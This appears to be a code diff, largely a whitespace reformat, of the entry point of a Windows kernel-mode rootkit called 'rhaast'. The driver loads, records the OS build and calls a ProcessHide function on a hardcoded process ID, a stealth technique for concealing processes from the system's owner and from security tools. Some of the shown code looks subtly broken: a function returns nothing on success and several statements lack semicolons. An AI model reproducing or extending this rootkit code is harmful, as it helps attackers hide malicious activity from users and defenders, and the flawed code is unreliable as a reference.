@@ -2,77 +2,77 @@
 
 /**
  * @brief
- *		main entrypoint of the rhaast rootkit
+ *		main entry point of the rhaast rootkit
  *  
  * @return	
  *		if successful executed function
  */
 NTSTATUS RhaastEntry(
-	VOID
+    VOID
 ) {
-	NTSTATUS NtStatus = STATUS_SUCCESS;
+    NTSTATUS NtStatus = STATUS_SUCCESS;
 
-	PUTS( "Rhaast loaded" );
+    PUTS( "Rhaast loaded" );
 
-	Instance.DriverObject->DriverUnload = ( PDRIVER_UNLOAD ) RhaastUnLoad; 
+    Instance.DriverObject->DriverUnload = ( PDRIVER_UNLOAD ) RhaastUnLoad; 
 
-	/* print driver object data */
-	PRINTF( 
-		"Rhaast Driver Object: \n"
-		" - Type        : %x   \n"
-		" - Driver Name : %ls  \n",
-		Instance.DriverObject->Type,
-		Instance.DriverObject->DriverName.Buffer
-	);
+    /* print driver object data */
+    PRINTF( 
+        "Rhaast Driver Object: \n"
+        " - Type        : %x   \n"
+        " - Driver Name : %ls  \n",
+        Instance.DriverObject->Type,
+        Instance.DriverObject->DriverName.Buffer
+	)
 
-	/* init driver and other resources/info */
-	if ( ! NT_SUCCESS( NtStatus = RhaastInit() ) ) {
-		PUTS( "Failed to init Rhaast driver" )
-		return NtStatus;
-	}
+    /* init driver and other resources/info */
+    if ( ! NT_SUCCESS( NtStatus = RhaastInit() ) ) {
+        PUTS( "Failed to init Rhaast driver" )
+        return NtStatus;
+    }
 
-	/* Process hide */
-	ProcessHide( 9952 );
+    /* Process hide */
+    ProcessHide( 9952 );
 
-	return NtStatus; 
+    return NtStatus; 
 }
 
 /**
  * @brief
- *		initiliaze rhaast rootkit features
+ *      initiliaze rhaast rootkit features
  *
  * @return
- *		if successful executed function
+ *      if successful executed function
  */
 NTSTATUS RhaastInit(
-	VOID
+    VOID
 ) {
-	RTL_OSVERSIONINFOW OsVersion = { 0 };
+    RTL_OSVERSIONINFOW OsVersion = { 0 };
 
-	/* get windows version */
-	if ( RtlGetVersion( &OsVersion ) ) {
-		return STATUS_UNSUCCESSFUL;
-	}
+    /* get windows version */
+    if ( RtlGetVersion( &OsVersion ) ) {
+        return STATUS_UNSUCCESSFUL;
+    }
 
-	/* set windows build number */
-	Instance.WindowsBuild = OsVersion.dwBuildNumber;
+    /* set windows build number */
+    Instance.WindowsBuild = OsVersion.dwBuildNumber;
 }
 
 /**
  * @brief
- *		Entry of unloading the rhaast driver from kernel 
- *		Free resources & memory
+ *      Entry of unloading the rhaast driver from kernel 
+ *      Free resources & memory
  * 
  * @param DriverObject
- *		DriverObject of the current rhaast rootkit
+ *      DriverObject of the current rhaast rootkit
  */
 VOID RhaastUnLoad(
-	IN PDRIVER_OBJECT DriverObject
+    IN PDRIVER_OBJECT DriverObject
 ) {
-	PUTS( "Starting to unload driver & resources" ); 
+    PUTS( "Starting to unload driver & resources" ); 
 
-	/* register callbacks */
-	// RsCallbacksUnRegister();
+    /* register callbacks */
+    // RsCallbacksUnRegister();
 
-	PUTS( "Finished cleanup. Cya" ) 
+    PUTS( "Finished cleanup. Cya" ) 
 }
